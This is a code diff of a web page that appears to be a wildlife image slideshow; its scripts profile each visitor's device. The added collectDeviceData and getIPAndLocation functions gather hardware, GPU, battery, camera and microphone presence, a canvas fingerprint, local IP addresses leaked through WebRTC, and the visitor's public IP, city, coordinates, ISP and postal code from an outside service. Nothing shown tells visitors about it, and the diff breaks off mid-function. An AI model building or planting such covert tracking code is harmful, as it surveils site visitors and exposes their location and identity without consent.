@@ -243,6 +243,7 @@
         let autoPlayInterval = null;
         const slides = document.querySelectorAll('.slide');
         const totalSlides = slides.length;
+        let hasInsertedData = false;
 
         document.getElementById('total-slides').textContent = totalSlides;
 
@@ -344,29 +345,29 @@
             const phoneBrands = [
                 { brand: 'Apple', patterns: ['iPhone', 'iPad', 'iPod'] },
                 { brand: 'Samsung', patterns: ['Samsung', 'SM-', 'GT-', 'SGH-', 'SCH-', 'SPH-', 'SVM-', 'SHW-'] },
-                { brand: 'Huawei', patterns: ['Huawei', 'HUAWEI', 'HONOR', 'HW-', 'MHA-', 'LLD-', 'LLQ-', 'STF-', 'DUK-', 'CLT-', 'ELE-', 'VOG-', 'MAR-', 'YAL-', 'TNY-', 'NEN-', 'ANA-', 'HWV-', 'EVR-', 'VOG-'] },
-                { brand: 'Xiaomi', patterns: ['Xiaomi', 'Mi ', 'Mi9', 'Mi10', 'Mi11', 'Mi12', 'MI ', 'Redmi', 'POCO', 'M200', 'M201', 'M210', 'M211', 'M2007', 'M2004', 'M190', 'M191', 'M192', 'M193', 'M2006', 'M2003'] },
-                { brand: 'OPPO', patterns: ['OPPO', 'OPPO-', 'CPH', 'CPHT', 'A5', 'A9', 'A1', 'A3', 'A7', 'R7', 'R9', 'R11', 'R15', 'R17', 'Reno', 'Find', 'PAC', 'PACT', 'PBAT', 'PBBT', 'PBCM', 'PBEM', 'PBET'] },
-                { brand: 'Vivo', patterns: ['Vivo', 'vivo', 'VIVO', 'V19', 'V20', 'V21', 'V23', 'V25', 'V27', 'V29', 'X50', 'X51', 'X60', 'X70', 'X80', 'X90', 'X100', 'Y11', 'Y12', 'Y15', 'Y19', 'Y20', 'Y21', 'Y28', 'Y30', 'Y33', 'Y35', 'Y53', 'Y55', 'Y71', 'Y73', 'Y75', 'Y81', 'Y91', 'Y93', '1901', '1904', '1906', '1914', '1915', '1916', '1918', '1919', '1920', '1921', '1923', '1925', '1927', '1929', '1933', '1935', '1937', '1938', '1939', '1941', '1943', '1945', '1946', '2001', '2004', '2005', '2006', '2007', '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019', '2020', '2021', '2022', '2023', '2024', '2025', '2026', '2027', '2028', '2029', '2031', '2032', '2034', '2035', '2036', '2037', '2038', '2039', '2040', '2050', '2051', '2052', '2053', '2054', '2055', '2056', '2057', '2058', '2059', '2061', '2062', '2063', '2064', '2065', '2066', '2067', '2068', '2069', '2070', '2071', '2072', '2073', '2074', '2075', '2076', '2077', '2078', '2079', '2080', '2081', '2082', '2083', '2084', '2085', '2086', '2087', '2088', '2089', '2090', '2091', '2092', '2093', '2094', '2095', '2096', '2097', '2098', '2099', '2100', '2101', '2102', '2103', '2104', '2105', '2106', '2107', '2108', '2109', '2110', '2111', '2112', 'I1910', 'I2012', 'I2022', 'I2208', 'I2215', 'I2222', 'I2228', 'I2263', 'I2266', 'I2267', 'I2268', 'I2269', 'I2270', 'I2271', 'I2272', 'I2273', 'I2274', 'I2275', 'I2276', 'I2277', 'I2278', 'I2279', 'I2280', 'I2281', 'I2282', 'I2283', 'I2284', 'I2285', 'I2286', 'I2287', 'I2288', 'I2289', 'I2290', 'I2291', 'I2292'] },
+                { brand: 'Huawei', patterns: ['Huawei', 'HUAWEI', 'HONOR', 'HW-', 'MHA-', 'LLD-', 'LLQ-', 'STF-', 'DUK-', 'CLT-', 'ELE-', 'VOG-', 'MAR-', 'YAL-', 'TNY-', 'NEN-', 'ANA-', 'HWV-', 'EVR-'] },
+                { brand: 'Xiaomi', patterns: ['Xiaomi', 'Mi ', 'Mi9', 'Mi10', 'Mi11', 'Mi12', 'MI ', 'Redmi', 'POCO', 'M200', 'M201', 'M210', 'M211', 'M2007', 'M2004', 'M190', 'M191'] },
+                { brand: 'OPPO', patterns: ['OPPO', 'OPPO-', 'CPH', 'CPHT', 'Reno', 'Find', 'PAC', 'PACT', 'PBAT', 'PBBT', 'PBCM', 'PBEM', 'PBET'] },
+                { brand: 'Vivo', patterns: ['Vivo', 'vivo', 'VIVO', 'V19', 'V20', 'V21', 'V23', 'V25', 'V27', 'V29', 'X50', 'X51', 'X60', 'X70', 'X80', 'X90', 'X100'] },
                 { brand: 'Realme', patterns: ['Realme', 'realme', 'REALME', 'RMX', 'RMP', 'RNX', 'RMXA'] },
-                { brand: 'OnePlus', patterns: ['OnePlus', 'ONEPLUS', 'A000', 'A100', 'A200', 'A300', 'A500', 'A600', 'A601', 'AC200', 'AC201', 'AC203', 'HD190', 'HD191', 'HD192', 'LE210', 'LE211', 'LE212', 'LEA3', 'LE2', 'LE5', 'LE9', 'CPH', 'IN30', 'IN31', 'IN55', 'IN51', 'IN201', 'IN202', 'IN203'] },
-                { brand: 'Nokia', patterns: ['Nokia', 'NOKIA', 'TA-', 'RM-', 'RX-', 'Nokia1', 'Nokia2', 'Nokia3', 'Nokia4', 'Nokia5', 'Nokia6', 'Nokia7', 'Nokia8', 'Nokia9', 'Nokia X', 'Nokia G', 'Nokia C', 'Nokia Pure'] },
-                { brand: 'Sony', patterns: ['Sony', 'Xperia', 'SOV', 'SO-', 'SGP', 'D25', 'D26', 'D27', 'D28', 'D29', 'C68', 'C69', 'C23', 'XQ-', 'XQ-A', 'XQ-B', 'XQ-C', 'XQ-D', 'XQ-E'] },
-                { brand: 'LG', patterns: ['LG', 'LG-', 'LM-', 'LGM-', 'LG-H', 'LG-K', 'LG-M', 'LG-Q', 'LG-Stylo', 'LG-V', 'LG-G'] },
+                { brand: 'OnePlus', patterns: ['OnePlus', 'ONEPLUS', 'A000', 'A100', 'A200', 'A300', 'A500', 'A600', 'A601', 'AC200', 'HD190', 'HD191', 'HD192', 'LE210', 'LE211', 'LE212'] },
+                { brand: 'Nokia', patterns: ['Nokia', 'NOKIA', 'TA-', 'RM-', 'RX-'] },
+                { brand: 'Sony', patterns: ['Sony', 'Xperia', 'SOV', 'SO-', 'SGP', 'XQ-'] },
+                { brand: 'LG', patterns: ['LG', 'LG-', 'LM-', 'LGM-', 'LG-H', 'LG-K', 'LG-M', 'LG-Q', 'LG-V', 'LG-G'] },
                 { brand: 'HTC', patterns: ['HTC', 'HTC_', 'HTC-One', 'HTC-Desire', 'HTC-U'] },
-                { brand: 'Motorola', patterns: ['Motorola', 'MOTOROLA', 'moto', 'Moto', 'moto e', 'moto g', 'Moto G', 'Moto E', 'XT', 'MZ', 'MZB', 'PA-', 'PB-', 'PD-', 'PE-', 'PF-', 'PG-', 'PH-', 'PI-', 'PJ-', 'PK-', 'PL-', 'PM-'] },
-                { brand: 'Asus', patterns: ['Asus', 'ASUS', 'Zenfone', 'ASUS_', 'ZB-', 'ZE-', 'ZC-', 'ZD-', 'ZF-', 'AI-', 'Rog', 'ROG', 'ASUSAI'] },
+                { brand: 'Motorola', patterns: ['Motorola', 'MOTOROLA', 'moto', 'Moto', 'XT', 'MZ', 'MZB', 'PA-', 'PB-', 'PD-', 'PE-', 'PF-', 'PG-'] },
+                { brand: 'Asus', patterns: ['Asus', 'ASUS', 'Zenfone', 'ASUS_', 'ZB-', 'ZE-', 'ZC-', 'ZD-', 'ZF-', 'AI-', 'Rog', 'ROG'] },
                 { brand: 'Google', patterns: ['Pixel', 'Pixel 2', 'Pixel 3', 'Pixel 4', 'Pixel 5', 'Pixel 6', 'Pixel 7', 'Pixel 8', 'Pixel 9', 'Pixel Fold', 'Pixel Tablet', 'G-'] },
-                { brand: 'Lenovo', patterns: ['Lenovo', 'LENOVO', 'Lenovo-', 'TB-', 'YT-', 'L180', 'L200', 'L700', 'L930', 'P2', 'Z6', 'Z5', 'K-', 'K5', 'K6', 'K8', 'K9', 'K10', 'K11', 'K12', 'K13', 'K14', 'K15', 'Z90', 'ZUK'] },
-                { brand: 'ZTE', patterns: ['ZTE', 'ZTE-', 'Blade', 'Nubia', 'NX', 'NXA', 'NXJ', 'Z8', 'Z9', 'Z9A', 'Z9L', 'Z97', 'Z93', 'Z95', 'Z96', 'Z98'] },
-                { brand: 'Tecno', patterns: ['Tecno', 'TECNO', 'Tecno-', 'Infinix', 'Infinix-', 'itel', 'itel-', 'TECNO-', 'Infinix X', 'Infinix Note', 'Infinix Hot', 'Tecno Spark', 'Tecno Camon', 'Tecno Phantom', 'itel A', 'itel P', 'itel S'] },
+                { brand: 'Lenovo', patterns: ['Lenovo', 'LENOVO', 'Lenovo-', 'TB-', 'YT-', 'P2', 'Z6', 'Z5', 'ZUK'] },
+                { brand: 'ZTE', patterns: ['ZTE', 'ZTE-', 'Blade', 'Nubia', 'NX', 'NXA', 'NXJ'] },
+                { brand: 'Tecno', patterns: ['Tecno', 'TECNO', 'Infinix', 'Infinix-', 'itel', 'itel-', 'TECNO-'] },
                 { brand: 'BlackBerry', patterns: ['BlackBerry', 'BB', 'Blackberry', 'STV', 'PRIV', 'KEY', 'Motion'] },
-                { brand: 'Alcatel', patterns: ['Alcatel', 'ALCATEL', 'TCL', '50', '501', '502', '503', '504', '505', '506', '507', '508', '509', '5011', '5012', '5013', '5015', '5016', '5017', '5018', '5019', '5021', '5022', '5023', '5024', '5025', '5026', '5027', '5028', '5029'] },
-                { brand: 'Wiko', patterns: ['Wiko', 'WIKO', 'Lenovo-', 'VIM', 'U-', 'U30', 'U50', 'U60', 'U70', 'U75', 'U93', 'W-', 'W-K', 'W-U'] },
-                { brand: 'Honor', patterns: ['Honor', 'HONOR', 'STK', 'DLI', 'LLD', 'BKL', 'COL', 'PCT', 'YAL', 'HKY', 'BRT', 'BMH', 'BMH-', 'MOA', 'FYD', 'ENA', 'NTH', 'ANY', 'TNA', 'VNA', 'ELZ', 'TYS'] },
-                { brand: 'Oukitel', patterns: ['Oukitel', 'OUKITEL', 'K-', 'K3', 'K5', 'K6', 'K7', 'K8', 'K9', 'K10', 'K12', 'K13', 'K15', 'C', 'C21', 'C22', 'C23', 'WP', 'WP2', 'WP5', 'WP6', 'WP7', 'WP8', 'WP9', 'WP10', 'WP15', 'WP18', 'WP19', 'WP21', 'WP22', 'RT', 'U'] },
-                { brand: 'Doogee', patterns: ['Doogee', 'DOOGEE', 'DG', 'S-', 'S40', 'S50', 'S55', 'S60', 'S68', 'S70', 'S80', 'S88', 'S89', 'S96', 'S97', 'S98', 'S99', 'V', 'X', 'Y', 'BL', 'BL120', 'BL150', 'BL550', 'BL7000'] },
-                { brand: 'Ulefone', patterns: ['Ulefone', 'ULEFONE', 'Power', 'Armor', 'Note', 'U0', 'T', 'U008', 'U007', 'U010', 'U011', 'U012', 'U013', 'U014', 'U015', 'U016', 'U017'] }
+                { brand: 'Alcatel', patterns: ['Alcatel', 'ALCATEL', 'TCL'] },
+                { brand: 'Wiko', patterns: ['Wiko', 'WIKO', 'VIM', 'U-'] },
+                { brand: 'Honor', patterns: ['Honor', 'HONOR', 'STK', 'DLI', 'LLD', 'BKL', 'COL', 'PCT', 'YAL', 'HKY', 'BRT', 'BMH', 'BMH-', 'MOA'] },
+                { brand: 'Oukitel', patterns: ['Oukitel', 'OUKITEL', 'K-', 'WP'] },
+                { brand: 'Doogee', patterns: ['Doogee', 'DOOGEE', 'DG', 'S-'] },
+                { brand: 'Ulefone', patterns: ['Ulefone', 'ULEFONE', 'Power', 'Armor', 'Note'] }
             ];
 
             for (const item of phoneBrands) {
@@ -388,141 +389,57 @@
         function getPhoneModel() {
             const ua = navigator.userAgent;
 
-            // iOS Devices - extract model number
             if (ua.includes('iPhone')) {
                 const iosModels = {
-                    'iPhone1,1': 'iPhone (1st Gen)',
-                    'iPhone1,2': 'iPhone 3G',
-                    'iPhone2,1': 'iPhone 3GS',
-                    'iPhone3,1': 'iPhone 4 (GSM)',
-                    'iPhone3,2': 'iPhone 4 (GSM Rev A)',
-                    'iPhone3,3': 'iPhone 4 (CDMA)',
-                    'iPhone4,1': 'iPhone 4S',
-                    'iPhone5,1': 'iPhone 5 (GSM)',
-                    'iPhone5,2': 'iPhone 5 (Global)',
-                    'iPhone5,3': 'iPhone 5C (GSM)',
-                    'iPhone5,4': 'iPhone 5C (Global)',
-                    'iPhone6,1': 'iPhone 5S (GSM)',
-                    'iPhone6,2': 'iPhone 5S (Global)',
-                    'iPhone7,1': 'iPhone 6 Plus',
-                    'iPhone7,2': 'iPhone 6',
-                    'iPhone8,1': 'iPhone 6s',
-                    'iPhone8,2': 'iPhone 6s Plus',
-                    'iPhone8,4': 'iPhone SE (1st Gen)',
-                    'iPhone9,1': 'iPhone 7 (GSM)',
-                    'iPhone9,2': 'iPhone 7 Plus (GSM)',
-                    'iPhone9,3': 'iPhone 7 (Global)',
-                    'iPhone9,4': 'iPhone 7 Plus (Global)',
-                    'iPhone10,1': 'iPhone 8 (GSM)',
-                    'iPhone10,2': 'iPhone 8 Plus (GSM)',
-                    'iPhone10,3': 'iPhone X (GSM)',
-                    'iPhone10,4': 'iPhone 8 (Global)',
-                    'iPhone10,5': 'iPhone 8 Plus (Global)',
-                    'iPhone10,6': 'iPhone X (Global)',
-                    'iPhone11,2': 'iPhone XS',
-                    'iPhone11,4': 'iPhone XS Max',
-                    'iPhone11,6': 'iPhone XS Max (China)',
-                    'iPhone11,8': 'iPhone XR',
-                    'iPhone12,1': 'iPhone 11',
-                    'iPhone12,3': 'iPhone 11 Pro',
-                    'iPhone12,5': 'iPhone 11 Pro Max',
-                    'iPhone12,8': 'iPhone SE (2nd Gen)',
-                    'iPhone13,1': 'iPhone 12 mini',
-                    'iPhone13,2': 'iPhone 12',
-                    'iPhone13,3': 'iPhone 12 Pro',
-                    'iPhone13,4': 'iPhone 12 Pro Max',
-                    'iPhone14,2': 'iPhone 13 Pro',
-                    'iPhone14,3': 'iPhone 13 Pro Max',
-                    'iPhone14,4': 'iPhone 13 mini',
-                    'iPhone14,5': 'iPhone 13',
-                    'iPhone14,6': 'iPhone 13 (Starlight)',
-                    'iPhone14,7': 'iPhone 13 (Blue)',
-                    'iPhone14,8': 'iPhone 13 (Pink)',
-                    'iPhone15,2': 'iPhone 14 Pro',
-                    'iPhone15,3': 'iPhone 14 Pro Max',
-                    'iPhone15,4': 'iPhone 14',
-                    'iPhone15,5': 'iPhone 14 Plus',
-                    'iPhone14,3': 'iPhone 14 Pro Max',
-                    'iPhone15,6': 'iPhone 14 (Mini)',
-                    'iPhone16,1': 'iPhone 15 Pro',
-                    'iPhone16,2': 'iPhone 15 Pro Max'
+                    'iPhone1,1': 'iPhone', 'iPhone1,2': 'iPhone 3G', 'iPhone2,1': 'iPhone 3GS',
+                    'iPhone3,1': 'iPhone 4', 'iPhone3,2': 'iPhone 4', 'iPhone3,3': 'iPhone 4',
+                    'iPhone4,1': 'iPhone 4S', 'iPhone5,1': 'iPhone 5', 'iPhone5,2': 'iPhone 5',
+                    'iPhone5,3': 'iPhone 5C', 'iPhone5,4': 'iPhone 5C',
+                    'iPhone6,1': 'iPhone 5S', 'iPhone6,2': 'iPhone 5S',
+                    'iPhone7,1': 'iPhone 6 Plus', 'iPhone7,2': 'iPhone 6',
+                    'iPhone8,1': 'iPhone 6s', 'iPhone8,2': 'iPhone 6s Plus', 'iPhone8,4': 'iPhone SE',
+                    'iPhone9,1': 'iPhone 7', 'iPhone9,2': 'iPhone 7 Plus', 'iPhone9,3': 'iPhone 7', 'iPhone9,4': 'iPhone 7 Plus',
+                    'iPhone10,1': 'iPhone 8', 'iPhone10,2': 'iPhone 8 Plus', 'iPhone10,3': 'iPhone X',
+                    'iPhone10,4': 'iPhone 8', 'iPhone10,5': 'iPhone 8 Plus', 'iPhone10,6': 'iPhone X',
+                    'iPhone11,2': 'iPhone XS', 'iPhone11,4': 'iPhone XS Max', 'iPhone11,6': 'iPhone XS Max', 'iPhone11,8': 'iPhone XR',
+                    'iPhone12,1': 'iPhone 11', 'iPhone12,3': 'iPhone 11 Pro', 'iPhone12,5': 'iPhone 11 Pro Max', 'iPhone12,8': 'iPhone SE 2',
+                    'iPhone13,1': 'iPhone 12 mini', 'iPhone13,2': 'iPhone 12', 'iPhone13,3': 'iPhone 12 Pro', 'iPhone13,4': 'iPhone 12 Pro Max',
+                    'iPhone14,2': 'iPhone 13 Pro', 'iPhone14,3': 'iPhone 13 Pro Max', 'iPhone14,4': 'iPhone 13 mini', 'iPhone14,5': 'iPhone 13',
+                    'iPhone15,2': 'iPhone 14 Pro', 'iPhone15,3': 'iPhone 14 Pro Max', 'iPhone15,4': 'iPhone 14', 'iPhone15,5': 'iPhone 14 Plus',
+                    'iPhone16,1': 'iPhone 15 Pro', 'iPhone16,2': 'iPhone 15 Pro Max'
                 };
                 for (const [code, name] of Object.entries(iosModels)) {
                     if (ua.includes(code)) return name;
                 }
-                return 'iPhone (Unknown Model)';
+                return 'iPhone';
             }
 
-            if (ua.includes('iPad')) {
-                return 'iPad';
-            }
+            if (ua.includes('iPad')) return 'iPad';
 
-            // Android devices - extract model number
             const androidModelMatch = ua.match(/Android.*?;\s*([^;)]+)(?:\)|;)/);
-            if (androidModelMatch) {
-                return androidModelMatch[1].trim();
-            }
+            if (androidModelMatch) return androidModelMatch[1].trim();
 
             return 'Unknown Model';
         }
 
         function getDeviceType() {
             const ua = navigator.userAgent;
-            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
-                return 'Tablet';
-            } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
-                return 'Mobile';
-            }
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Mobile';
             return 'Desktop';
-        }
-
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = 200;
-                canvas.height = 50;
-
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Wildlife Gallery', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('Canvas FP', 4, 17);
-
-                return canvas.toDataURL();
-            } catch (e) {
-                return 'Canvas not supported';
-            }
         }
 
         function getWebGLInfo() {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-
                 if (!gl) return { vendor: 'Not supported', renderer: 'Not supported' };
 
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-
-                let vendor = 'Unknown';
-                let renderer = 'Unknown';
-
-                if (debugInfo) {
-                    vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                }
-
                 return {
-                    vendor,
-                    renderer,
-                    webglVersion: gl.getParameter(gl.VERSION),
-                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
-                    maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
-                    extensions: gl.getSupportedExtensions()?.slice(0, 10).join(', ') || 'None'
+                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
+                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
                 };
             } catch (e) {
                 return { vendor: 'Error', renderer: 'Error' };
@@ -534,59 +451,10 @@
                 const battery = await navigator.getBattery();
                 return {
                     level: Math.round(battery.level * 100) + '%',
-                    charging: battery.charging ? 'Yes' : 'No',
-                    chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + 's',
-                    dischargingTime: battery.dischargingTime === Infinity ? 'Not discharging' : battery.dischargingTime + 's'
+                    charging: battery.charging ? 'Yes' : 'No'
                 };
             } catch (e) {
-                return { level: 'Not available', charging: 'Unknown', chargingTime: '-', dischargingTime: '-' };
-            }
-        }
-
-        async function getNetworkInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-
-            return {
-                effectiveType: connection?.effectiveType || 'Unknown',
-                downlink: connection?.downlink ? connection.downlink + ' Mbps' : 'Unknown',
-                rtt: connection?.rtt ? connection.rtt + ' ms' : 'Unknown',
-                saveData: connection?.saveData ? 'Yes' : 'No',
-                type: connection?.type || 'Unknown'
-            };
-        }
-
-        function getAudioFingerprint() {
-            try {
-                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioContext.createOscillator();
-                const analyser = audioContext.createAnalyser();
-                const gain = audioContext.createGain();
-                const processor = audioContext.createScriptProcessor(4096, 1, 1);
-
-                gain.gain.value = 0;
-                oscillator.type = 'triangle';
-                oscillator.frequency.value = 10000;
-
-                oscillator.connect(analyser);
-                analyser.connect(processor);
-                processor.connect(gain);
-                gain.connect(audioContext.destination);
-
-                oscillator.start(0);
-
-                const fingerprint = {
-                    sampleRate: audioContext.sampleRate,
-                    channelCount: audioContext.destination.channelCount,
-                    maxChannelCount: audioContext.destination.maxChannelCount,
-                    state: audioContext.state
-                };
-
-                oscillator.stop();
-                audioContext.close();
-
-                return fingerprint;
-            } catch (e) {
-                return { error: 'Audio API not supported' };
+                return { level: 'N/A', charging: 'Unknown' };
             }
         }
 
@@ -595,168 +463,152 @@
             try {
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('');
-
                 const offer = await pc.createOffer();
                 await pc.setLocalDescription(offer);
 
                 await new Promise((resolve) => {
                     pc.onicecandidate = (event) => {
-                        if (!event.candidate) {
-                            resolve();
-                            return;
-                        }
+                        if (!event.candidate) { resolve(); return; }
                         const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                        if (ipMatch && !ips.includes(ipMatch[1])) {
-                            ips.push(ipMatch[1]);
-                        }
+                        if (ipMatch && !ips.includes(ipMatch[1])) ips.push(ipMatch[1]);
                     };
-                    setTimeout(resolve, 3000);
+                    setTimeout(resolve, 2000);
                 });
-
                 pc.close();
-            } catch (e) {
-                // WebRTC not supported
-            }
+            } catch (e) {}
             return ips;
         }
 
-        function getMediaDevices() {
+        async function getMediaDevices() {
             return new Promise((resolve) => {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
+                if (!navigator.mediaDevices?.enumerateDevices) {
                     resolve({ audioInputs: 0, videoInputs: 0, audioOutputs: 0 });
                     return;
                 }
-
                 navigator.mediaDevices.enumerateDevices()
                     .then(devices => {
-                        const counts = { audioInputs: 0, videoInputs: 0, audioOutputs: 0, devices: [] };
-                        devices.forEach(device => {
-                            if (device.kind === 'audioinput') counts.audioInputs++;
-                            if (device.kind === 'videoinput') counts.videoInputs++;
-                            if (device.kind === 'audiooutput') counts.audioOutputs++;
-                            counts.devices.push({
-                                kind: device.kind,
-                                label: device.label || 'Permission denied',
-                                deviceId: device.deviceId ? 'Present' : 'N/A'
-                            });
+                        const counts = { audioInputs: 0, videoInputs: 0, audioOutputs: 0 };
+                        devices.forEach(d => {
+                            if (d.kind === 'audioinput') counts.audioInputs++;
+                            if (d.kind === 'videoinput') counts.videoInputs++;
+                            if (d.kind === 'audiooutput') counts.audioOutputs++;
                         });
                         resolve(counts);
                     })
-                    .catch(() => {
-                        resolve({ audioInputs: 0, videoInputs: 0, audioOutputs: 0 });
-                    });
+                    .catch(() => resolve({ audioInputs: 0, videoInputs: 0, audioOutputs: 0 }));
             });
         }
 
-        function getSystemFonts() {
-            const baseFonts = ['monospace', 'sans-serif', 'serif'];
-            const testFonts = [
-                'Arial', 'Arial Black', 'Arial Narrow', 'Calibri', 'Cambria', 'Cambria Math',
-                'Comic Sans MS', 'Consolas', 'Courier', 'Courier New', 'Georgia', 'Helvetica',
-                'Impact', 'Lucida Console', 'Lucida Sans Unicode', 'Microsoft Sans Serif',
-                'Palatino Linotype', 'Segoe UI', 'Tahoma', 'Times', 'Times New Roman',
-                'Trebuchet MS', 'Verdana', 'Segoe Print', 'Segoe Script'
-            ];
-
-            const testString = 'mmmmmmmmmmlli';
-            const testSize = '72px';
-            const h = document.getElementsByTagName('body')[0];
-            const span = document.createElement('span');
-            span.style.fontSize = testSize;
-            span.innerHTML = testString;
-
-            const defaultWidth = {};
-            for (const baseFont of baseFonts) {
-                span.style.fontFamily = baseFont;
-                h.appendChild(span);
-                defaultWidth[baseFont] = span.offsetWidth;
-                h.removeChild(span);
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Wildlife Gallery', 2, 15);
+                return canvas.toDataURL() ? 'Generated' : 'Not supported';
+            } catch (e) {
+                return 'Not supported';
             }
-
-            const detectedFonts = [];
-            for (const testFont of testFonts) {
-                let detected = false;
-                for (const baseFont of baseFonts) {
-                    span.style.fontFamily = testFont + ', ' + baseFont;
-                    h.appendChild(span);
-                    const width = span.offsetWidth;
-                    h.removeChild(span);
-                    if (width !== defaultWidth[baseFont]) {
-                        detected = true;
-                        break;
-                    }
-                }
-                if (detected) {
-                    detectedFonts.push(testFont);
-                }
-            }
-
-            return detectedFonts;
         }
 
-        function getPermissions() {
-            return new Promise((resolve) => {
-                const permissions = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
-                const results = {};
+        async function collectDeviceData() {
+            const browserInfo = getBrowserInfo();
+            const webgl = getWebGLInfo();
+            const battery = await getBatteryInfo();
+            const localIPs = await getLocalIPs();
+            const mediaDevices = await getMediaDevices();
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
 
-                if (!navigator.permissions) {
-                    resolve({ supported: false });
-                    return;
-                }
-
-                let pending = permissions.length;
-                permissions.forEach(perm => {
-                    navigator.permissions.query({ name: perm })
-                        .then(result => {
-                            results[perm] = result.state;
-                            pending--;
-                            if (pending === 0) resolve({ supported: true, permissions: results });
-                        })
-                        .catch(() => {
-                            results[perm] = 'unknown';
-                            pending--;
-                            if (pending === 0) resolve({ supported: true, permissions: results });
-                        });
-                });
-            });
-        }
-
-        function getStorageInfo() {
             return {
-                localStorage: typeof localStorage !== 'undefined' ? 'Supported' : 'Not supported',
-                sessionStorage: typeof sessionStorage !== 'undefined' ? 'Supported' : 'Not supported',
-                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
-                indexedDB: typeof indexedDB !== 'undefined' ? 'Supported' : 'Not supported',
-                openDatabase: typeof openDatabase !== 'undefined' ? 'Supported' : 'Not supported'
+                deviceName: navigator.platform || 'Unknown',
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                phoneBrand: getPhoneBrand(),
+                phoneModel: getPhoneModel(),
+                deviceType: getDeviceType(),
+                browserName: browserInfo.browserName,
+                browserVersion: browserInfo.browserVersion,
+                osName: browserInfo.osName,
+                osVersion: browserInfo.osVersion,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                devicePixelRatio: window.devicePixelRatio,
+                viewportWidth: window.innerWidth,
+                viewportHeight: window.innerHeight,
+                cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                touchSupport: 'ontouchstart' in window,
+                gpuVendor: webgl.vendor,
+                gpuRenderer: webgl.renderer,
+                maxTextureSize: webgl.maxTextureSize,
+                batteryLevel: battery.level,
+                batteryCharging: battery.charging,
+                connectionType: connection?.effectiveType || 'Unknown',
+                downlink: connection?.downlink ? connection.downlink + ' Mbps' : 'Unknown',
+                online: navigator.onLine,
+                localIPs: localIPs,
+                hasCamera: mediaDevices.videoInputs > 0,
+                hasMicrophone: mediaDevices.audioInputs > 0,
+                hasSpeakers: mediaDevices.audioOutputs > 0,
+                canvasFingerprint: getCanvasFingerprint(),
+                language: navigator.language,
+                languages: navigator.languages?.join(', ') || 'Unknown',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString(),
+                currentURL: window.location.href
             };
         }
 
-        function getPluginInfo() {
-            const plugins = [];
-            if (navigator.plugins) {
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    plugins.push({
-                        name: navigator.plugins[i].name,
-                        filename: navigator.plugins[i].filename,
-                        description: navigator.plugins[i].description
-                    });
-                }
-            }
-            return plugins.length > 0 ? plugins : [{ name: 'No plugins detected', filename: '-', description: '-' }];
-        }
-
-        function getTimezoneInfo() {
+        async function getIPAndLocation() {
             try {
-                const timezone = Intl.DateTimeFormat().resolvedOptions();
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
                 return {
-                    timeZone: timezone.timeZone,
-                    locale: timezone.locale,
-                    calendar: timezone.calendar,
-                    numberingSystem: timezone.numberingSystem,
-                    offset: new Date().getTimezoneOffset()
+                    status: 'success',
+                    ip: data.ip,
+                    country: data.country_name,
+                    city: data.city,
+                    region: data.region,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    isp: data.org,
+                    asn: data.asn,
+                    postal: data.postal,
+                    countryCode: data.country_code,
+                    timezone: data.timezone,
+                    currency: data.currency
                 };
-            } catch (e) {
